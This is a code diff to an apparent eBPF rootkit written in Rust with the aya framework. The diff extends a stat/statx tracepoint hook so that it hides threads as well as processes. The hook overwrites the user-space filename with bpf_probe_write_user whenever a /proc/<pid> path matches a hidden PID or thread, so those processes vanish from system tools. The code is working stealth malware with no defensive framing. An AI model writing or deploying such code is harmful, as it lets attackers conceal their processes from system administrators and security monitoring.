@@ -2,15 +2,12 @@ use core::str::from_utf8_unchecked;
 
 use aya_ebpf::{
     helpers::{bpf_probe_read_user_str_bytes, bpf_probe_write_user},
-    macros::{map, tracepoint},
-    maps::HashMap,
+    macros::tracepoint,
     programs::TracePointContext,
 };
 use aya_log_ebpf::info;
 
-use crate::HIDDEN_PIDS;
-#[map]
-static PID_STATS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(32, 0);
+use crate::{HIDDEN_PIDS, HIDDEN_THREADS};
 
 #[tracepoint]
 pub fn statx_enter(ctx: TracePointContext) -> Result<u32, u32> {
@@ -38,7 +35,7 @@ fn stat_tp(ctx: TracePointContext, offset: usize, tp_name: &str) -> Result<u32, 
 
     if is_proc(fname) {
         if let Some(pid) = extract_proc_pid(fname) {
-            if unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
+            if unsafe { HIDDEN_PIDS.get(&pid).is_some() || HIDDEN_THREADS.get(&pid).is_some() } {
                 info!(&ctx, "{}(/proc/pid/{}..) detected", tp_name, pid);
                 let buf = [0u8];
                 unsafe { bpf_probe_write_user(filename_ptr as *mut u8, &buf as *const u8) }
